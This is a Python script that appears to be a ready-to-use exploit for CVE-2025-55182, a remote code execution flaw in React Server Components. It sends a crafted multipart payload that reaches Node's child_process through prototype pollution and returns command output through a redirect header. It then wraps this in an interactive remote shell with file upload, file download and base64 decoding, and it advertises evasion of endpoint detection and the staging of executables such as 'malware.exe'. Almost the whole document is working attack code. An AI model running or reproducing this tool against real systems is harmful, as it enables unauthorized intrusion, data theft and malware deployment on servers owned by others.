#!/usr/bin/env python3

import argparse
import sys
import hashlib
import time
import re
import base64
import os
from urllib.parse import unquote
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Theme:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'

class ExploitConfig:
    def __init__(self):
        self.target_url = "http://localhost:3000"
        self.timeout = 15
        
    def normalize_url(self, url):
        if not re.match(r'^https?://', url):
            return f"http://{url}"
        return url

class PayloadGenerator:    
    @staticmethod
    def generate_hash(length=8):
        timestamp = str(time.time()).encode()
        return hashlib.sha256(timestamp).hexdigest()[:length]
    
    @staticmethod
    def sanitize_command(cmd):
        return cmd.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '')
    
    @staticmethod
    def build_exploit_payload(command):
        safe_cmd = PayloadGenerator.sanitize_command(command)
        injection = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
            f'"var res=process.mainModule.require(\'child_process\').execSync(\'{safe_cmd}\')'
            '.toString();var b64=Buffer.from(res).toString(\'base64\');;throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
            '{digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`});","_chunks":"$Q2",'
            '"_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        boundary = "----HacxMeBoundaryX9K2pLvN4MqR8TdF"
        
        body_parts = [
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="0"\r\n\r\n',
            f'{injection}\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="1"\r\n\r\n',
            '"$@0"\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="2"\r\n\r\n',
            '[]\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF--\r\n"
        ]
        
        return ''.join(body_parts), boundary

class ExploitEngine:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.command_count = 0
        
    def craft_headers(self, boundary):
        return {
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': PayloadGenerator.generate_hash(8),
            'X-Nextjs-Html-Request-Id': PayloadGenerator.generate_hash(20),
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        }
    
    def execute(self, command, silent=False):
        self.command_count += 1
        payload_body, boundary = PayloadGenerator.build_exploit_payload(command)
        headers = self.craft_headers(boundary)
        
        try:
            response = self.session.post(
                self.config.target_url,
                data=payload_body,
                headers=headers,
                timeout=self.config.timeout,
                allow_redirects=False,
                verify=False
            )
            
            return self.parse_response(response, silent)
            
        except requests.exceptions.Timeout:
            return False, 'timeout', 'Connection timeout'
        except requests.exceptions.SSLError as e:
            return False, 'ssl', str(e)
        except requests.exceptions.RequestException as e:
            return False, 'unknown', str(e)
    
    def parse_response(self, response, silent=False):
        redirect_header = response.headers.get('X-Action-Redirect', '')
        match = re.search(r'/login\?a=([^;]*)', redirect_header)
        
        if match:
            encoded_output = match.group(1)
            url_decoded = unquote(encoded_output)
            try:
                decoded_output = base64.b64decode(url_decoded).decode('utf-8', errors='replace')
            except:
                decoded_output = url_decoded
            return True, 'success', decoded_output
        
        if response.status_code == 403:
            return False, 'forbidden', 'HTTP 403 Forbidden'
        elif response.status_code == 500:
            return False, 'server_error', 'HTTP 500 Internal Server Error'
        else:
            return False, 'unknown', f'HTTP {response.status_code}'

class InteractiveShell:
    def __init__(self, target_url):
        self.config = ExploitConfig()
        self.config.target_url = self.config.normalize_url(target_url)
        self.engine = ExploitEngine(self.config)
        self.command_history = []
        self.current_dir = None
        
    def show_banner(self):
        banner = f"""
{Theme.OKCYAN}╔══════════════════════════════════════════════════════════╗
║  CVE-2025-55182 Interactive Exploitation Shell           ║
║  React Server Components RCE                             ║
╚══════════════════════════════════════════════════════════╝{Theme.ENDC}

{Theme.OKGREEN}[+] Target:{Theme.ENDC} {self.config.target_url}
{Theme.OKGREEN}[+] Type 'help' for available commands{Theme.ENDC}
"""
        print(banner)
        
    def show_help(self):
        help_text = f"""
{Theme.OKBLUE}{Theme.BOLD}Built-in Commands:{Theme.ENDC}
  {Theme.OKCYAN}help{Theme.ENDC}              - Show this help message
  {Theme.OKCYAN}exit, quit{Theme.ENDC}        - Exit the shell
  {Theme.OKCYAN}clear{Theme.ENDC}             - Clear screen
  {Theme.OKCYAN}info{Theme.ENDC}              - Show target information
  {Theme.OKCYAN}upload <file>{Theme.ENDC}     - Upload base64 file via echo (saves as out.b64)
  {Theme.OKCYAN}upload-node <file>{Theme.ENDC}- Upload base64 file via Node.js (better EDR evasion)
  {Theme.OKCYAN}decode <in> <out>{Theme.ENDC} - Decode base64 file via Node.js (e.g., decode out.b64 payload.exe)
  {Theme.OKCYAN}download <file>{Theme.ENDC}   - Download file from target and save locally
  {Theme.OKCYAN}timeout [sec]{Theme.ENDC}     - Show or set request timeout (e.g., timeout 30)
  {Theme.OKCYAN}history{Theme.ENDC}           - Show command history
  
{Theme.OKBLUE}{Theme.BOLD}System Commands:{Theme.ENDC}
  Any other command will be executed on the target system
  
{Theme.OKBLUE}{Theme.BOLD}Examples:{Theme.ENDC}
  {Theme.DIM}whoami{Theme.ENDC}                      - Get current user
  {Theme.DIM}dir / ls{Theme.ENDC}                    - List directory
  {Theme.DIM}type file.txt / cat file{Theme.ENDC}    - Read file
  {Theme.DIM}powershell -c pwd{Theme.ENDC}           - Run PowerShell command
  {Theme.DIM}upload payload.b64{Theme.ENDC}          - Upload via echo (simple, size limited)
  {Theme.DIM}upload-node payload.b64{Theme.ENDC}     - Upload via Node.js (EDR evasion, larger files)
  {Theme.DIM}decode out.b64 malware.exe{Theme.ENDC}  - Decode base64 to binary (no certutil!)
  {Theme.DIM}download package.json{Theme.ENDC}       - Download file
  {Theme.DIM}timeout{Theme.ENDC}                     - Show current timeout
  {Theme.DIM}timeout 30{Theme.ENDC}                  - Set timeout to 30 seconds
"""
        print(help_text)
    
    def show_info(self):
        print(f"\n{Theme.OKBLUE}[*] Gathering target information...{Theme.ENDC}")
        
        info_commands = [
            ("OS Info", "ver", "uname -a"),
            ("Current User", "whoami", "whoami"),
            ("Hostname", "hostname", "hostname"),
            ("Current Directory", "cd", "pwd"),
        ]
        
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        
        # Show local config first
        print(f"{Theme.OKCYAN}{'Request Timeout':20s}:{Theme.ENDC} {self.config.timeout}s")
        print(f"{Theme.OKCYAN}{'Commands Executed':20s}:{Theme.ENDC} {self.engine.command_count}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        
        for label, win_cmd, unix_cmd in info_commands:
            success, _, output = self.engine.execute(win_cmd, silent=True)
            if not success or not output.strip():
                success, _, output = self.engine.execute(unix_cmd, silent=True)
            
            if success and output.strip():
                print(f"{Theme.OKGREEN}{label:20s}:{Theme.ENDC} {output.strip()}")
            else:
                print(f"{Theme.WARNING}{label:20s}:{Theme.ENDC} {Theme.DIM}N/A{Theme.ENDC}")
        
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")
    
    def upload_file(self, filepath, use_node=False):
        if not os.path.exists(filepath):
            print(f"{Theme.FAIL}[!] Error: File '{filepath}' not found{Theme.ENDC}")
            return
        
        try:
            # Both methods expect pre-encoded base64 file and write AS-IS (no decode)
            with open(filepath, 'r') as f:
                b64_content = f.read().strip()
            
            filesize = len(b64_content)
            
            if use_node:
                # Node.js method - use String.fromCharCode to avoid quotes and echo
                print(f"{Theme.OKCYAN}[*] Uploading {filepath} ({filesize} chars) via Node.js...{Theme.ENDC}")
                
                # Convert strings to String.fromCharCode format (no quotes needed!)
                def to_charcode(s):
                    return ','.join(str(ord(c)) for c in s)
                
                fs_code = to_charcode('fs')
                out_code = to_charcode('out.b64')
                
                # Chunked upload - no echo, no pipe, pure Node.js
                chunk_size = 2000  # Safe size to avoid command line limit
                chunks = [b64_content[i:i+chunk_size] for i in range(0, len(b64_content), chunk_size)]
                
                print(f"{Theme.OKCYAN}[*] Uploading in {len(chunks)} chunk(s)...{Theme.ENDC}")
                
                for idx, chunk in enumerate(chunks):
                    chunk_code = to_charcode(chunk)
                    
                    if idx == 0:
                        # First chunk - writeFileSync (create/overwrite)
                        cmd = f"node -e require(String.fromCharCode({fs_code})).writeFileSync(String.fromCharCode({out_code}),String.fromCharCode({chunk_code}))"
                    else:
                        # Subsequent chunks - appendFileSync
                        cmd = f"node -e require(String.fromCharCode({fs_code})).appendFileSync(String.fromCharCode({out_code}),String.fromCharCode({chunk_code}))"
                    
                    success, status, output = self.engine.execute(cmd, silent=True)
                    
                    if not success and status != 'server_error':
                        print(f"{Theme.FAIL}[!] Upload failed at chunk {idx+1}/{len(chunks)}: {output}{Theme.ENDC}")
                        return
                
                print(f"{Theme.OKGREEN}[+] File uploaded successfully -> out.b64{Theme.ENDC}")
                print(f"{Theme.DIM}[*] Use 'decode out.b64 output.file' to decode{Theme.ENDC}")
            else:
                # Echo method - write base64 content using echo
                print(f"{Theme.OKCYAN}[*] Uploading {filepath} ({filesize} chars) via echo...{Theme.ENDC}")
                
                cmd = f'echo {b64_content} > out.b64'
                success, status, output = self.engine.execute(cmd, silent=True)
                
                if success or status == 'server_error':
                    print(f"{Theme.OKGREEN}[+] File uploaded successfully -> out.b64{Theme.ENDC}")
                    print(f"{Theme.DIM}[*] Use 'decode out.b64 output.file' to decode{Theme.ENDC}")
                else:
                    print(f"{Theme.FAIL}[!] Upload failed: {output}{Theme.ENDC}")
                
        except Exception as e:
            print(f"{Theme.FAIL}[!] Error: {e}{Theme.ENDC}")
    
    def download_file(self, remote_path):
        print(f"{Theme.OKCYAN}[*] Downloading {remote_path}...{Theme.ENDC}")
        
        # Try different commands based on OS
        commands = [
            f"type {remote_path}",           # Windows
            f"cat {remote_path}",             # Unix
            f"powershell -c Get-Content {remote_path}"  # PowerShell
        ]
        
        for cmd in commands:
            success, status, output = self.engine.execute(cmd, silent=True)
            if success and output.strip():
                filename = os.path.basename(remote_path)
                local_path = f"downloaded_{filename}"
                
                try:
                    with open(local_path, 'w', encoding='utf-8') as f:
                        f.write(output)
                    print(f"{Theme.OKGREEN}[+] File saved to: {local_path}{Theme.ENDC}")
                    return
                except Exception as e:
                    print(f"{Theme.FAIL}[!] Error saving file: {e}{Theme.ENDC}")
                    return
        
        print(f"{Theme.FAIL}[!] Failed to download file{Theme.ENDC}")
    
    def execute_command(self, command):
        self.command_history.append(command)
        
        success, status, output = self.engine.execute(command)
        
        if success:
            if output.strip():
                print(output)
            else:
                print(f"{Theme.DIM}(no output){Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Command failed: {output}{Theme.ENDC}")
    
    def show_history(self):
        print(f"\n{Theme.OKBLUE}Command History:{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        for idx, cmd in enumerate(self.command_history, 1):
            print(f"{Theme.DIM}{idx:3d}.{Theme.ENDC} {cmd}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")
    
    def set_timeout(self, args):
        if not args:
            # Show current timeout
            print(f"{Theme.OKGREEN}[*] Current timeout: {self.config.timeout} seconds{Theme.ENDC}")
        else:
            try:
                new_timeout = int(args)
                if new_timeout <= 0:
                    print(f"{Theme.FAIL}[!] Timeout must be positive{Theme.ENDC}")
                    return
                old_timeout = self.config.timeout
                self.config.timeout = new_timeout
                print(f"{Theme.OKGREEN}[+] Timeout changed: {old_timeout}s -> {new_timeout}s{Theme.ENDC}")
            except ValueError:
                print(f"{Theme.FAIL}[!] Invalid timeout value. Usage: timeout <seconds>{Theme.ENDC}")
    
    def decode_base64_file(self, args):
        """Decode base64 file using Node.js (EDR evasion - no certutil)"""
        parts = args.split()
        if len(parts) < 2:
            print(f"{Theme.FAIL}[!] Usage: decode <input.b64> <output.bin>{Theme.ENDC}")
            return
        
        input_file = parts[0]
        output_file = parts[1]
        
        print(f"{Theme.OKCYAN}[*] Decoding {input_file} -> {output_file} via Node.js...{Theme.ENDC}")
        
        # Convert strings to String.fromCharCode format
        def to_charcode(s):
            return ','.join(str(ord(c)) for c in s)
        
        fs_code = to_charcode('fs')
        input_code = to_charcode(input_file)
        output_code = to_charcode(output_file)
        utf8_code = to_charcode('utf8')
        base64_code = to_charcode('base64')
        
        # Decode base64 using Node.js - no quotes, pure String.fromCharCode
        cmd = f"node -e require(String.fromCharCode({fs_code})).writeFileSync(String.fromCharCode({output_code}),Buffer.from(require(String.fromCharCode({fs_code})).readFileSync(String.fromCharCode({input_code}),String.fromCharCode({utf8_code})).trim(),String.fromCharCode({base64_code})))"
        
        success, status, output = self.engine.execute(cmd, silent=True)
        
        if success or status == 'server_error':
            print(f"{Theme.OKGREEN}[+] File decoded successfully -> {output_file}{Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Decode failed: {output}{Theme.ENDC}")
    
    def get_prompt(self):
        cmd_num = len(self.command_history) + 1
        return f"{Theme.FAIL}{Theme.BOLD}rce{Theme.ENDC} {Theme.OKCYAN}@{Theme.ENDC} {Theme.OKGREEN}{self.config.target_url.split('://')[-1]}{Theme.ENDC} {Theme.WARNING}#{cmd_num}{Theme.ENDC} > "
    
    def run(self):
        self.show_banner()
        
        # Test connection
        print(f"{Theme.OKCYAN}[*] Testing connection...{Theme.ENDC}")
        success, _, _ = self.engine.execute("whoami", silent=True)
        if success:
            print(f"{Theme.OKGREEN}[+] Connection established!{Theme.ENDC}\n")
        else:
            print(f"{Theme.WARNING}[!] Warning: Connection test failed, but continuing...{Theme.ENDC}\n")
        
        while True:
            try:
                user_input = input(self.get_prompt()).strip()
                
                if not user_input:
                    continue
                
                parts = user_input.split(maxsplit=1)
                cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""
                
                if cmd in ['exit', 'quit']:
                    print(f"\n{Theme.OKCYAN}[*] Exiting shell... Commands executed: {self.engine.command_count}{Theme.ENDC}\n")
                    break
                    
                elif cmd == 'help':
                    self.show_help()
                    
                elif cmd == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.show_banner()
                    
                elif cmd == 'info':
                    self.show_info()
                    
                elif cmd == 'upload':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: upload <file>{Theme.ENDC}")
                    else:
                        self.upload_file(args, use_node=False)
                
                elif cmd == 'upload-node':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: upload-node <file>{Theme.ENDC}")
                    else:
                        self.upload_file(args, use_node=True)
                        
                elif cmd == 'download':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: download <remote_file>{Theme.ENDC}")
                    else:
                        self.download_file(args)
                        
                elif cmd == 'history':
                    self.show_history()
                
                elif cmd == 'timeout':
                    self.set_timeout(args)
                
                elif cmd == 'decode':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: decode <input.b64> <output.file>{Theme.ENDC}")
                    else:
                        self.decode_base64_file(args)
                    
                else:
                    # Execute as system command
                    self.execute_command(user_input)
                    
            except KeyboardInterrupt:
                print(f"\n{Theme.WARNING}[!] Use 'exit' to quit{Theme.ENDC}")
                continue
            except EOFError:
                print(f"\n{Theme.OKCYAN}[*] Exiting...{Theme.ENDC}\n")
                break

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-55182 Interactive Exploitation Shell',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t http://localhost:3000
  %(prog)s -t vulnerable-site.com
        """
    )
    
    parser.add_argument('-t', '--target', 
                       required=True,
                       metavar='URL',
                       help='Target URL or domain')
    parser.add_argument('-T', '--timeout',
                       type=int,
                       default=15,
                       metavar='SECONDS',
                       help='Request timeout in seconds (default: 15)')
    
    args = parser.parse_args()
    
    shell = InteractiveShell(args.target)
    shell.config.timeout = args.timeout
    shell.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Theme.WARNING}[!] Shell interrupted{Theme.ENDC}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Theme.FAIL}[!] Fatal error: {e}{Theme.ENDC}\n")
        sys.exit(1)

